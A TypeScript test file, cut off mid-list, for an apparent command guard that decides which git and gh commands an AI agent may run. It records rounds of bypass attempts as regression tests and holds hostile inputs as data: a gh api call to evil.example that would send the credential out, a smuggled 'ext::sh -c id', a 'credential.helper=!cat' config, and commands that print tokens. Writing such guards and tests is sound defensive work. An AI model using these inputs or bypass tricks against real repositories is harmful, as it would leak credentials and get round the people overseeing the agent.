// Independent review of round 2 (round 2b): each test is a bypass the round-2 code still let through.
// ---------------------------------------------------------------------------

describe("security review round 2b (attack regressions)", () => {
  const write = (action: string, ...privileged: string[]) => ({ access: "write", action, privileged });

  it("R1: allows only GraphQL mutations it can fence; merges, refs and commits by node ID are refused", () => {
    const mutation = (body: string) => classifyGitHubCommand("gh", ["api", "graphql", "-f", `query=${body}`]);
    for (const body of [
      'mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}',
      'mutation{createRef(input:{repositoryId:"R",name:"refs/heads/main",oid:"a"}){clientMutationId}}',
      'mutation{updateRef(input:{refId:"x",oid:"a",force:true}){clientMutationId}}',
      'mutation{createCommitOnBranch(input:{branch:{branchName:"main"}}){clientMutationId}}',
      'mutation{a: mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}',
      'mutation{resolveReviewThread(input:{threadId:"T"}){clientMutationId} mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}',
      'mutation{...M} fragment M on Mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}',
      'mutation{... on Mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}}',
      'mutation{resolveReviewThread(input:{threadId:"T"}){clientMutationId} updateProjectV2ItemFieldValue(input:{}){clientMutationId}}',
    ]) {
      const result = mutation(body);
      expect(result.access, body).toBe("write");
      expect(result.denied, body).toMatch(/cannot check the GraphQL mutation|no subscriptions or fragments|separate gh api graphql calls|^Denied: agents never/);
    }
    expect(mutation('mutation{resolveReviewThread(input:{threadId:"T"}){thread{id}}}')).toEqual(write("comment"));
    expect(mutation('mutation($i: AddCommentInput!) { c: addComment(input: $i) @include(if: true) { clientMutationId } }')).toEqual(write("comment"));
    expect(mutation('mutation{updateProjectV2ItemFieldValue(input:{projectId:"P",itemId:"I",fieldId:"F",value:{text:"x"}}){clientMutationId}}')).toEqual(write("project"));
    expect(mutation("query{viewer{login}}")).toEqual({ access: "read", action: null, privileged: [] });
  });

  it("R1: reads gh api endpoints the way GitHub routes them, so spellings keep their privileged actions", () => {
    for (const path of ["repos/o/r/pulls/12/merge/", "repos/o/r//pulls/12/merge", "repos/o/r/./pulls/12/merge", "/repos/o/r/pulls/12/%6Derge"]) {
      expect(classifyGitHubCommand("gh", ["api", "-X", "PUT", path]), path).toEqual(write("pullRequest", "adminMerge"));
    }
    // Deleting the default branch is an operation agents never perform (any spelling).
    expect(classifyGitHubCommand("gh", ["api", "-X", "DELETE", "repos/o/r/git/refs/heads/main/"])).toMatchObject({ ...write("push", "pushToMain"), denied: expect.stringMatching(/^Denied: agents never/), integrity: true });
    expect(classifyGitHubCommand("gh", ["api", "-X", "PUT", "repos/o/r/pulls/12/../13/merge"]).denied).toMatch(/'\.\.'/);
    for (const args of [["api", "-X", "PUT", "repositories/123/pulls/12/merge"], ["api", "-X", "POST", "repositories/123/git/refs", "-f", "ref=refs/tags/v1"],
      ["api", "-X", "PUT", "repositories/123/contents/.github/workflows/x.yml"]]) {
      expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toMatch(/repos\/OWNER\/REPO/);
    }
    // gh's legacy :branch placeholder: refused in a write's endpoint (round 2e), and the default branch in a branch field.
    expect(classifyGitHubCommand("gh", ["api", "-X", "PATCH", "repos/:owner/:repo/git/refs/heads/:branch", "-f", "sha=a"]).denied).toMatch(/instead of gh placeholders/);
    expect(classifyGitHubCommand("gh", ["api", "-X", "PUT", "repos/o/r/contents/a.txt", "-f", "branch=:branch", "-f", "message=x"])).toEqual(write("commit", "pushToMain"));
  });

  it("R3: knows git's --attr-source and refuses global options it does not know", () => {
    expect(classifyGitHubCommand("git", ["--attr-source", "fetch", "push", "origin", "main"], { currentBranch: "main", touchesWorkflows: false })).toEqual(write("push", "pushToMain"));
    expect(classifyGitHubCommand("git", ["--attr-source=HEAD", "status"])).toEqual({ access: "none", action: null, privileged: [] });
    for (const args of [["--frobnicate", "fetch", "push", "origin", "main"], ["--list-cmd", "push"]]) {
      expect(classifyGitHubCommand("git", args), args.join(" ")).toMatchObject({ denied: expect.stringContaining("does not know the git option"), integrity: true });
    }
    expect(classifyGitHubCommand("git", ["-c", "core.quotePath=false", "--no-pager", "-C", "dir", "log"])).toEqual({ access: "none", action: null, privileged: [] });
  });

  it("R4: a deletion next to an update does not hide a workflow change", () => {
    const touching = { touchesWorkflows: true, currentBranch: "feature" };
    expect(classifyGitHubCommand("git", ["push", "origin", ":refs/heads/junk", "HEAD:refs/heads/feature"], touching).privileged).toContain("editWorkflows");
    expect(classifyGitHubCommand("git", ["push", "origin", ":refs/heads/junk"], touching).privileged).not.toContain("editWorkflows");
    expect(classifyGitHubCommand("git", ["push", "--delete", "origin", "junk"], touching).privileged).not.toContain("editWorkflows");
  });

  it("R6: marks the refusals that protect the credential itself, so they apply without a policy too", () => {
    expect(classifyGitHubCommand("gh", ["api", "https://evil.example/x"])).toMatchObject({ integrity: true });
    expect(classifyGitHubCommand("gh", ["api", "--hostname", "github.localhost", "user"])).toMatchObject({ integrity: true });
    expect(classifyGitHubCommand("git", ["send-pack", "https://github.com/o/r"])).toMatchObject({ integrity: true });
    // Policy refusals (privileged checks Paperclip cannot make) are not integrity refusals.
    expect(classifyGitHubCommand("git", ["push", "--tags", "origin"])).not.toHaveProperty("integrity");
    // A GraphQL mutation outside the fence may change repository settings by node ID, so it is refused for every company.
    expect(classifyGitHubCommand("gh", ["api", "graphql", "-f", 'query=mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}'])).toMatchObject({ integrity: true });
  });
});

// ---------------------------------------------------------------------------
// Renewed review of round 2b (round 2c): each test is a bypass the round-2b code still let through.
// ---------------------------------------------------------------------------

describe("security review round 2c (attack regressions)", () => {
  const read = { access: "read", action: null, privileged: [] };
  const write = (action: string, ...privileged: string[]) => ({ access: "write", action, privileged });

  it("N1: refuses gh options before the command group or before the verb, which gh skips when it finds the command", () => {
    for (const args of [["-X", "PUT", "api", "repos/o/x/contents/y", "-f", "branch=main"], ["--frob", "pr", "create"]]) {
      expect(classifyGitHubCommand("gh", args), args.join(" ")).toMatchObject({ access: "write", denied: expect.stringContaining("Put the gh command first"), integrity: true });
    }
    // gh reads a leading -R as the command's own (round 2d): accepted.
    expect(classifyGitHubCommand("gh", ["-R", "o/other", "pr", "create", "--title", "t", "--body", "b"])).toEqual(write("pullRequest"));
    for (const args of [["pr", "--body", "x", "merge", "5", "--admin"], ["pr", "--title", "list", "create"]]) {
      expect(classifyGitHubCommand("gh", args), args.join(" ")).toMatchObject({ access: "write", denied: expect.stringContaining("Put the verb right after") });
    }
    // -R (any form) may come first; the verb is then found.
    expect(classifyGitHubCommand("gh", ["pr", "-R", "o/r", "merge", "5", "--admin"])).toEqual(write("pullRequest", "adminMerge"));
    expect(classifyGitHubCommand("gh", ["pr", "--repo=o/r", "view", "5"])).toEqual(read);
    expect(classifyGitHubCommand("gh", ["--version"])).toEqual(read);
  });

  it("N2: GitHub routes GraphQL case-insensitively, so every spelling is parsed as GraphQL", () => {
    for (const route of ["GraphQL", "GRAPHQL", "/Graphql", "https://api.github.com/GraphQL"]) {
      expect(classifyGitHubCommand("gh", ["api", route, "-f", 'query=mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}']).denied, route)
        .toMatch(/cannot check the GraphQL mutation mergePullRequest/);
      expect(classifyGitHubCommand("gh", ["api", route, "-f", "query={viewer{login}}"]), route).toEqual(read);
    }
    // Writes outside repos/OWNER/REPO/… and graphql name no repository Paperclip can fence.
    for (const args of [["api", "-X", "POST", "user/repos", "-f", "name=x"], ["api", "-X", "POST", "REPOS/o/r/issues"], ["api", "-X", "PUT", "orgs/o/actions/permissions"]]) {
      expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toMatch(/only under repos\/OWNER\/REPO/);
    }
  });

  it("N3: a half-filled placeholder path names a repository Paperclip cannot see, so it is refused", () => {
    for (const path of ["repos/{owner}/other/contents/x", "repos/evil/{repo}/issues", "repos/:owner/other/pulls"]) {
      expect(classifyGitHubCommand("gh", ["api", "-X", "PUT", path, "-f", "message=m"]).denied, path).toMatch(/placeholders together/);
    }
    expect(classifyGitHubCommand("gh", ["api", "repos/{owner}/{repo}/pulls"])).toEqual(read);
  });

  it("N4: reads git network options exactly; abbreviations and unknown clustered options are refused", () => {
    const push = (...args: string[]) => classifyGitHubCommand("git", ["push", ...args], { touchesWorkflows: false, currentBranch: "feat" });
    for (const args of [["--push-o", "x", "https://github.com/o/r2", "HEAD:refs/heads/main"], ["--rep=https://github.com/o/r2"], ["-fx", "origin", "feat"]]) {
      expect(push(...args), args.join(" ")).toMatchObject({ access: "write", denied: expect.stringContaining("does not know the git push option") });
    }
    for (const args of [["--dep", "1", "https://github.com/o/r"], ["--bra", "main", "https://github.com/o/r"]]) {
      expect(classifyGitHubCommand("git", ["clone", ...args]).denied, args.join(" ")).toMatch(/does not know the git clone option/);
    }
    // Clustered flags with a value option last take the next argument, as git does.
    expect(push("-fo", "ci.skip", "origin", "HEAD:refs/heads/feat")).toEqual({ ...write("push"), branchRewrites: ["feat"] });
    // -f in the cluster force-pushes: to the default branch, that is an operation agents never perform.
    expect(push("-fo", "ci.skip", "origin", "HEAD:refs/heads/main")).toMatchObject({ ...write("push", "pushToMain"), denied: expect.stringMatching(/^Denied: agents never/), integrity: true });
    expect(gitNetworkArguments("push", ["-fo", "ci.skip", "origin", "main"])).toMatchObject({ positional: ["origin", "main"], flags: new Set(["-f"]) });
    expect(gitNetworkArguments("pull", ["-S", "origin", "main"])).toMatchObject({ positional: ["origin", "main"] });
    expect(gitNetworkArguments("clone", ["--depth=1", "-b", "release/1.0", "https://github.com/o/r", "dir"])).toMatchObject({ positional: ["https://github.com/o/r", "dir"] });
  });

  it("N5: a -d that is an option's value does not make a push a deletion", () => {
    const touching = { touchesWorkflows: true, currentBranch: "feat" };
    for (const option of ["--exec", "-o", "--receive-pack"]) {
      expect(classifyGitHubCommand("git", ["push", option, "-d", "origin", "HEAD:refs/heads/feat"], touching).privileged, option).toContain("editWorkflows");
    }
    expect(classifyGitHubCommand("git", ["push", "-d", "origin", "feat"], touching).privileged).not.toContain("editWorkflows");
  });

  it("N6: refuses an -R hidden in a cluster of short options", () => {
    for (const args of [["pr", "create", "-dRother/repo", "--title", "t"], ["pr", "merge", "5", "-dRtenant.ghe.com/o/r", "--admin"]]) {
      expect(classifyGitHubCommand("gh", args), args.join(" ")).toMatchObject({ denied: expect.stringContaining("Write -R OWNER/REPO on its own"), integrity: true });
    }
    expect(classifyGitHubCommand("gh", ["pr", "create", "-Rother/repo", "--fill"])).toEqual(write("pullRequest"));
  });

  it("classifies REST writes that start deploys or update the default branch as privileged", () => {
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/deployments", "-f", "ref=main"])).toEqual(write("other", "deploymentApproval"));
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/deployments/9/statuses", "-f", "state=success"])).toEqual(write("other", "deploymentApproval"));
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/merge-upstream", "-f", "branch=main"])).toEqual(write("push", "pushToMain"));
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/merge-upstream", "-f", "branch=feat"])).toEqual(write("push"));
    // gh api options added in recent gh versions.
    expect(classifyGitHubCommand("gh", ["api", "--allow-escape-sequences", "repos/o/r/pulls"])).toEqual(read);
  });
});
// ---------------------------------------------------------------------------
// Third review (round 2d).
// ---------------------------------------------------------------------------

describe("security review round 2d (attack regressions)", () => {
  const read = { access: "read", action: null, privileged: [] };
  const write = (action: string, ...privileged: string[]) => ({ access: "write", action, privileged });

  it("A: refuses an empty argument before the verb, which gh skips when it finds the command", () => {
    for (const args of [["pr", "", "merge", "--admin", "--squash"], ["", "pr", "merge", "--admin", "--squash"], ["pr", "-R", "o/r", "", "merge", "--admin"],
      ["", "release", "create", "engine@1"], ["api", "", "-X", "PUT", "repos/o/r/pulls/1/merge"]]) {
      expect(classifyGitHubCommand("gh", args), JSON.stringify(args)).toMatchObject({ access: "write", denied: expect.any(String), integrity: true });
    }
    // An empty value of an option is ordinary.
    expect(classifyGitHubCommand("gh", ["pr", "edit", "5", "--body", ""])).toEqual(write("pullRequest"));
    expect(classifyGitHubCommand("gh", ["pr", "merge", "5", "--admin", "--body", ""])).toEqual(write("pullRequest", "adminMerge"));
  });

  it("B: an unreadable git option protects the credential too, so it refuses without a policy", () => {
    expect(classifyGitHubCommand("git", ["fetch", "--dry", "ext::sh -c id"])).toMatchObject({ denied: expect.stringContaining("does not know the git fetch option"), integrity: true });
  });

  it("C: a tag named by a gh placeholder cannot be checked for release tags", () => {
    for (const args of [
      ["api", "-X", "POST", "repos/{owner}/{repo}/git/refs", "-F", "ref=refs/tags/{branch}", "-f", "sha=a"],
      ["api", "-X", "POST", "repos/o/r/releases", "-F", "tag_name={branch}"],
      ["api", "-X", "POST", "repos/o/r/git/tags", "-f", "tag=:branch", "-f", "object=a"],
      ["api", "-X", "DELETE", "repos/o/r/git/refs/tags/{branch}"],
    ]) expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toMatch(/Name the tag literally|instead of gh placeholders/);
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/releases", "-f", "tag_name=v1.2.0"])).toEqual(write("other", "release"));
  });

  it("regressions: leading -R, git options git accepts, markdown rendering and -R=", () => {
    expect(classifyGitHubCommand("gh", ["-R", "o/r", "pr", "view", "5"])).toEqual(read);
    expect(classifyGitHubCommand("gh", ["--repo=o/r", "issue", "list"])).toEqual(read);
    expect(classifyGitHubCommand("git", ["fetch", "--refetch", "origin"])).toEqual(read);
    expect(classifyGitHubCommand("git", ["fetch", "--no-quiet", "--negotiate-only", "--negotiation-tip", "HEAD", "origin"])).toEqual(read);
    expect(classifyGitHubCommand("git", ["ls-remote", "--exec", "git-upload-pack", "origin"])).toEqual(read);
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "markdown", "-f", "text=hi"])).toEqual(read);
  });
});
// ---------------------------------------------------------------------------
// Narrow re-review of round 2d (round 2e).
// ---------------------------------------------------------------------------

describe("security review round 2e (attack regressions)", () => {
  it("C1-C3: a write may not let gh fill its endpoint, ref or tag from the checkout's branch name", () => {
    for (const args of [
      ["api", "-X", "POST", "repos/o/r/git/refs", "-F", "ref=refs/tags/:branch-x", "-f", "sha=a"],
      ["api", "-X", "DELETE", "repos/o/r/git/refs/tags/:branch-x"],
      ["api", "-X", "POST", "repos/o/r/releases", "-F", "tag_name=:branch-x"],
      ["api", "-X", "POST", "repos/o/r/git/refs", "-F", "ref=refs/:branch", "-f", "sha=a"],
      ["api", "-X", "POST", "repos/o/r/git/refs", "-F", "ref=:branch", "-f", "sha=a"],
      ["api", "-X", "PATCH", "repos/o/r/git/refs/:branch", "-f", "sha=a", "-F", "force=true"],
      ["api", "-X", "DELETE", "repos/o/r/git/refs/{branch}"],
      ["api", "-X", "PUT", "repos/o/r/:branch"],
      ["api", "-X", "PUT", "repos/o/r/%3Abranch"],
    ]) expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toMatch(/instead of gh placeholders|Name the tag literally/);
    // Reads may still use placeholders.
    expect(classifyGitHubCommand("gh", ["api", "repos/{owner}/{repo}/git/refs/heads/{branch}"])).toEqual({ access: "read", action: null, privileged: [] });
  });

  it("F: refuses gh commands that only print the credential", () => {
    for (const args of [["auth", "token"], ["auth", "status", "--show-token"], ["auth", "status", "-t"], ["auth", "git-credential", "get"]]) {
      expect(classifyGitHubCommand("gh", args), args.join(" ")).toMatchObject({ denied: expect.stringContaining("print them"), integrity: true });
    }
    expect(classifyGitHubCommand("gh", ["auth", "status"])).toEqual({ access: "read", action: null, privileged: [] });
  });
});


describe("security review round 3 (attack regressions)", () => {
  it("B3: a push may not recurse into submodules, whose remotes Paperclip never checks", () => {
    for (const args of [
      ["push", "--recurse-submodules=on-demand", "origin", "feature"],
      ["push", "--recurse-submodules", "only", "origin", "feature"],
      ["push", "--recurse-submodules=yes", "origin", "feature"],
      ["push", "--recurse-submodules=check", "--recurse-submodules=on-demand", "origin", "feature"],
    ]) expect(classifyGitHubCommand("git", args), args.join(" ")).toMatchObject({ access: "write", denied: expect.stringContaining("submodules"), integrity: true });
    // What git reads from -c or --config-env on the command line (reported by the launcher) counts too.
    for (const recursion of ["on-demand", "only", "unknown"]) {
      expect(classifyGitHubCommand("git", ["push", "origin", "feature"], { recurseSubmodules: recursion }), recursion).toMatchObject({ denied: expect.stringContaining("submodules"), integrity: true });
    }
    for (const args of [["push", "--recurse-submodules=no", "origin", "feature"], ["push", "--recurse-submodules=check", "origin", "feature"], ["push", "origin", "feature"]]) {
      expect(classifyGitHubCommand("git", args).denied, args.join(" ")).toBeUndefined();
    }
  });

  it("B1: push.followTags sends tags with any refspec, so the push is a tag push", () => {
    expect(gitPushDestinations(["origin", "main"], { followTags: true })).toEqual(["refs/tags/*", "refs/heads/main"]);
    expect(classifyGitHubCommand("git", ["push", "origin", "feature"], { followTags: true }).privileged).toContain("tagPush");
    expect(classifyGitHubCommand("git", ["push", "--no-follow-tags", "origin", "feature"], { followTags: true }).privileged).not.toContain("tagPush");
    expect(classifyGitHubCommand("git", ["push", "origin", "feature"]).privileged).not.toContain("tagPush");
  });

  it("m1: refuses every spelling of the gh commands that print the credential", () => {
    for (const args of [
      ["auth", "status", "--show-token=true"], ["auth", "status", "-t=true"], ["auth", "status", "-at"], ["auth", "status", "-ta"], ["auth", "status", "--show-token=1"],
      ["config", "get", "-h", "github.com", "oauth_token"], ["config", "get", "oauth_token"], ["config", "get", "--host=github.com", "OAUTH_TOKEN"],
    ]) expect(classifyGitHubCommand("gh", args), args.join(" ")).toMatchObject({ denied: expect.stringContaining("print them"), integrity: true });
    for (const args of [["auth", "status"], ["auth", "status", "--show-token=false"], ["auth", "status", "-a"], ["config", "get", "git_protocol"], ["config", "list"]]) {
      expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toBeUndefined();
    }
  });

  it("A1: a method in a cluster of short options is a write, and the launcher's grammar says so", () => {
    for (const form of [["-iXPOST"], ["-hXPOST"], ["-iX", "POST"], ["-XPOST"], ["--method=POST"], ["-X=POST"], ["-ihX=DELETE"]]) {
      const args = ["api", ...form, "repos/o/r/issues"];
      expect(classifyGitHubCommand("gh", args), args.join(" ")).toMatchObject({ access: "write" });
      expect(ghCommandMayWrite(parseGhCommand(args)), args.join(" ")).toBe(true);
    }
    // An unknown letter in a cluster: Paperclip cannot tell what it sends.
    expect(classifyGitHubCommand("gh", ["api", "-zXPOST", "repos/o/r/issues"])).toMatchObject({ access: "write", integrity: true });
    expect(ghCommandMayWrite(parseGhCommand(["api", "-zXPOST", "repos/o/r/issues"]))).toBe(true);
    // An explicit GET reads for the launcher too (round 4, N4), as it does for the classifier.
    expect(ghCommandMayWrite(parseGhCommand(["api", "-XGET", "repos/o/r/pulls"]))).toBe(false);
    expect(classifyGitHubCommand("gh", ["api", "-XGET", "repos/o/r/pulls"])).toEqual({ access: "read", action: null, privileged: [] });
    expect(ghCommandMayWrite(parseGhCommand(["api", "repos/o/r/pulls"]))).toBe(false);
  });
});

describe("security review round 4 (attack regressions)", () => {
  it("N1: a push may not set config on its command line beyond a short allowlist (submodule recursion, includes)", () => {
    for (const args of [
      ["-c", "submodule.recurse=true", "push", "origin", "HEAD:refs/heads/f3"],
      ["-c", "Submodule.Recurse=true", "push", "origin", "HEAD:refs/heads/f3"],
      ["-c", "PUSH.RECURSESUBMODULES=on-demand", "push", "origin", "f3"],
      ["-csubmodule.recurse=true", "push", "origin", "f3"],
      ["--config-env=submodule.recurse=RECURSE", "push", "origin", "f3"],
      ["--config-env", "push.recurseSubmodules=RECURSE", "push", "origin", "f3"],
      ["-c", "include.path=/tmp/recurse.cfg", "push", "origin", "f3"],
      ["-c", "includeIf.gitdir:/tmp/.path=/tmp/recurse.cfg", "push", "origin", "f3"],
      ["-c", "credential.helper=!cat", "push", "origin", "f3"],
      ["-C", "repo", "-c", "submodule.recurse", "push", "origin", "f3"],
    ]) expect(classifyGitHubCommand("git", args), args.join(" ")).toMatchObject({ access: "write", denied: expect.stringContaining("command-line config"), integrity: true });
    for (const args of [["-c", "user.name=agent-owner", "push", "origin", "f3"], ["-c", "push.default=current", "push"], ["push", "origin", "f3"], ["-c", "submodule.recurse=true", "fetch", "origin"]]) {
      expect(classifyGitHubCommand("git", args).denied, args.join(" ")).toBeUndefined();
    }
  });

  it("N4: an explicit GET or HEAD runs without a managed credential, its fields as the query; any other method may write", () => {
    for (const form of [["-X", "GET"], ["-XGET"], ["-X=get"], ["--method=GET"], ["--method", "head"], ["-iXHEAD"], ["-hX", "Get"]]) {
      const args = ["api", ...form, "search/issues", "-f", "q=repo:o/r is:open"];
      expect(ghCommandMayWrite(parseGhCommand(args)), args.join(" ")).toBe(false);
      expect(classifyGitHubCommand("gh", args), args.join(" ")).toEqual({ access: "read", action: null, privileged: [] });
    }
    for (const form of [["-X", "POST"], ["-XGETX"], ["-X", ""], ["-X", "GET", "--input", "body.json"], ["-zXGET"]]) {
      expect(ghCommandMayWrite(parseGhCommand(["api", ...form, "search/issues"])), form.join(" ")).toBe(true);
    }
    expect(ghCommandMayWrite(parseGhCommand(["api", "-X", "GET", "graphql", "-f", "query={viewer{login}}"]))).toBe(true);
    expect(ghCommandMayWrite(parseGhCommand(["api", "search/issues", "-f", "q=x"]))).toBe(true);
  });

  it("round 4: the shared grammar marks every token-printing gh command, so the launcher never runs one", () => {
    for (const args of [["auth", "status", "-t"], ["auth", "status", "--show-token=true"], ["config", "get", "oauth_token"], ["auth", "status", "-at"], ["config", "get", "-h", "github.com", "oauth_token"], ["auth", "token"], ["auth", "git-credential", "get"]]) {
      const command = parseGhCommand(args);
      expect(command.printsToken, args.join(" ")).toBe(true);
      expect(ghCommandMayWrite(command), args.join(" ")).toBe(true);
      expect(classifyGitHubCommand("gh", args), args.join(" ")).toMatchObject({ denied: expect.stringContaining("print them"), integrity: true });
    }
    for (const args of [["auth", "status"], ["auth", "status", "--show-token=false"], ["config", "get", "git_protocol"]]) {
      expect(parseGhCommand(args).printsToken, args.join(" ")).toBe(false);
      expect(ghCommandMayWrite(parseGhCommand(args)), args.join(" ")).toBe(false);
    }
  });

  it("P4b: gh pr merge --auto and GraphQL merge, auto-merge and merge-queue mutations never pass as plain writes", () => {
    for (const mutation of ["mergePullRequest", "enablePullRequestAutoMerge", "enqueuePullRequest"]) {
      expect(classifyGitHubCommand("gh", ["api", "graphql", "-f", `query=mutation{${mutation}(input:{pullRequestId:"x"}){clientMutationId}}`]).denied, mutation).toMatch(/cannot check the GraphQL mutation/);
    }
    expect(classifyGitHubCommand("git", ["push", "origin", "HEAD:main"]).privileged).toContain("pushToMain");
  });
});

describe("parseGitHubDestination on hostile input", () => {
  it("rejects a path of many slashes in linear time (CodeQL polynomial regex)", () => {
    const slashes = "/".repeat(200_000);
    for (const value of [`https://github.com/${slashes}x`, `https://github.com/Anthm-FR${slashes}songtrivia${slashes}x`, `git@github.com:${slashes}a`]) {
      const started = performance.now();
      const destination = parseGitHubDestination(value, "git");
      expect(performance.now() - started).toBeLessThan(250);
      expect(destination.kind).not.toBe("github");
    }
    expect(parseGitHubDestination("https://github.com/Anthm-FR/songtrivia.git", "git")).toMatchObject({ kind: "github", repository: "anthm-fr/songtrivia" });
  });
});

// ---------------------------------------------------------------------------
// Operations agents never perform (2026-10-08: a `gh repo archive` archived a repository).
// Each is refused for every company, with or without a write identity policy.
// ---------------------------------------------------------------------------
describe("operations agents never perform", () => {
  const read = { access: "read", action: null, privileged: [] };
  const write = (action: string, ...privileged: string[]) => ({ access: "write", action, privileged });
  const sha = "a".repeat(40);
  const gh = (...args: string[]) => classifyGitHubCommand("gh", args);
  const graphql = (query: string, ...extra: string[]) => gh("api", "graphql", "-f", `query=${query}`, ...extra);
  const never = (what: RegExp) => expect.objectContaining({ access: "write", denied: expect.stringMatching(new RegExp(`^Denied: agents never ${what.source}`)), integrity: true });
  const repository = /archive, delete, rename, transfer or change the settings of a repository/;
  const defaultBranch = /delete or force-push a default or protected branch/;
  const protection = /change branch protection or rulesets/;
  const hooks = /change webhooks/;
  const secrets = /change secrets, variables or deploy keys/;
  const deployments = /delete deployments, change or delete environments, or mark a deployment inactive/;

  it.each([
    [["repo", "archive", "--yes"], repository],
    [["repo", "archive", "Anthm-FR/linkzic", "--yes"], repository],
    [["-R", "o/r", "repo", "archive", "--yes"], repository],
    [["repo", "-R", "o/r", "archive"], repository],
    [["repo", "unarchive", "o/r", "--yes"], repository],
    [["repo", "delete", "o/r", "--yes"], repository],
    [["repo", "rename", "new-name", "--yes"], repository],
    [["repo", "edit", "--visibility", "public", "--accept-visibility-change-consequences"], repository],
    [["repo", "edit", "o/r", "--default-branch", "develop"], repository],
    [["repo", "edit", "--description", "x"], repository],
    [["repo", "transfer", "o/r", "other-owner"], repository],
    [["repo", "deploy-key", "add", "key.pub", "--allow-write"], secrets],
    [["repo", "deploy-key", "delete", "42"], secrets],
    [["secret", "set", "TOKEN", "--body", "x"], secrets],
    [["secret", "set", "TOKEN", "--org", "acme", "--body", "x"], secrets],
    [["secret", "delete", "TOKEN"], secrets],
    [["variable", "set", "NAME", "--body", "x"], secrets],
    [["variable", "delete", "NAME", "--env", "production"], secrets],
    [["repo", "sync", "--force"], defaultBranch],
    [["repo", "sync", "o/fork", "--force", "--branch", "main"], defaultBranch],
    [["repo", "sync", "--force=true", "-bmaster"], defaultBranch],
  ])("refuses gh %j", (args, what) => {
    expect(gh(...args)).toEqual(never(what));
  });

  it.each([
    // The bare repository: archived, name, visibility, default_branch, a body Paperclip cannot see, or a deletion.
    [["api", "-X", "PATCH", "repos/o/r", "-F", "archived=true"], repository],
    [["api", "repos/o/r", "-X", "PATCH", "-F", "archived=true"], repository],
    [["api", "repos/o/r", "-F", "archived=true", "--method", "PATCH"], repository],
    [["api", "--method=PATCH", "repos/o/r", "-f", "name=renamed"], repository],
    [["api", "-XPATCH", "repos/o/r", "-fvisibility=public"], repository],
    [["api", "-iX", "PATCH", "repos/o/r", "-f", "default_branch=develop"], repository],
    [["api", "-X", "PATCH", "repos/o/r", "--input", "settings.json"], repository],
    [["api", "-X", "patch", "repos/o/r", "-f", "description=x"], repository],
    [["api", "-X", "DELETE", "repos/o/r"], repository],
    [["api", "-X", "DELETE", "/Repos/O/R/"], repository],
    [["api", "--method", "DELETE", "https://api.github.com/repos/o/r"], repository],
    [["api", "-X", "PATCH", "repositories/123", "-F", "archived=true"], repository],
    [["api", "-X", "PATCH", "repos/{owner}/{repo}", "-F", "archived=true"], repository],
    [["api", "repos/o/r/transfer", "-f", "new_owner=elsewhere"], repository],
    // Branch protection and rulesets, repository and organization.
    [["api", "-X", "PUT", "repos/o/r/branches/main/protection", "--input", "protection.json"], protection],
    [["api", "-X", "DELETE", "repos/o/r/branches/main/protection"], protection],
    [["api", "-X", "DELETE", "repos/o/r/branches/release%2F1/protection/required_status_checks"], protection],
    [["api", "-X", "PUT", "repos/o/r/branches/release/1/protection", "--input", "protection.json"], protection],
    [["api", "repos/o/r/rulesets", "-f", "name=x", "-f", "enforcement=active"], protection],
    [["api", "-X", "PUT", "repos/o/r/rulesets/5", "-f", "enforcement=disabled"], protection],
    [["api", "-X", "DELETE", "repos/o/r/rulesets/5"], protection],
    [["api", "-X", "DELETE", "orgs/acme/rulesets/5"], protection],
    // Webhooks.
    [["api", "-X", "DELETE", "repos/o/r/hooks/7"], hooks],
    [["api", "-X", "PATCH", "repos/o/r/hooks/7", "-F", "active=false"], hooks],
    [["api", "-X", "PATCH", "repos/o/r/hooks/7/config", "-f", "url=https://x.example"], hooks],
    [["api", "repos/o/r/hooks", "-f", "name=web"], hooks],
    [["api", "-X", "DELETE", "orgs/acme/hooks/7"], hooks],
    [["api", "--method", "PATCH", "orgs/acme/hooks/7", "-F", "active=false"], hooks],
    // Secrets, variables and deploy keys, repository and organization.
    [["api", "-X", "PUT", "repos/o/r/actions/secrets/TOKEN", "-f", "encrypted_value=x", "-f", "key_id=1"], secrets],
    [["api", "-X", "DELETE", "repos/o/r/actions/secrets/TOKEN"], secrets],
    [["api", "-X", "PATCH", "repos/o/r/actions/variables/NAME", "-f", "value=y"], secrets],
    [["api", "-X", "DELETE", "repos/o/r/actions/variables/NAME"], secrets],
    [["api", "repos/o/r/actions/variables", "-f", "name=NAME", "-f", "value=y"], secrets],
    [["api", "-X", "DELETE", "repos/o/r/dependabot/secrets/TOKEN"], secrets],
    [["api", "-X", "PUT", "repos/o/r/codespaces/secrets/TOKEN"], secrets],
    [["api", "-X", "PUT", "orgs/acme/actions/secrets/TOKEN", "-f", "visibility=all"], secrets],
    [["api", "-X", "DELETE", "orgs/acme/actions/variables/NAME"], secrets],
    [["api", "-X", "PATCH", "orgs/acme/actions/variables/NAME", "-f", "value=y"], secrets],
    [["api", "repos/o/r/keys", "-f", "key=ssh-ed25519 AAAA", "-F", "read_only=false"], secrets],
    // Environments and deployments.
    [["api", "-X", "DELETE", "repos/o/r/environments/production"], deployments],
    [["api", "-X", "PUT", "repos/o/r/environments/staging"], deployments],
    [["api", "-X", "PUT", "repos/o/r/environments/production/secrets/TOKEN"], deployments],
    [["api", "repos/o/r/environments/production/deployment-branch-policies", "-f", "name=*"], deployments],
    [["api", "-X", "DELETE", "repos/o/r/deployments/42"], deployments],
    [["api", "-X", "POST", "repos/o/r/deployments/42/statuses", "-f", "state=inactive"], deployments],
    [["api", "repos/o/r/deployments/42/statuses", "-F", "state=INACTIVE"], deployments],
    [["api", "repos/o/r/deployments/42/statuses", "-F", "state=@state.txt"], deployments],
